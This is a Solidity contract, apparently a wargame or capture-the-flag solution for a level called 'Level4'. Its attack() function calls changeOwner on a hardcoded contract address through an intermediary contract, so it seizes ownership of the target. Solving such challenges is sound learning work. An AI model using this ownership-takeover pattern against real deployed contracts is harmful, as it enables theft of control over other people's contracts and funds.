// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Level4 {
    address addr = 0x4a2215688322a7DC97CB23A10479833C3c90c424;

    function attack() public {
        (bool b,) = address(addr).call(abi.encodeWithSignature("changeOwner(address)", msg.sender));
        require(b);
    }
}
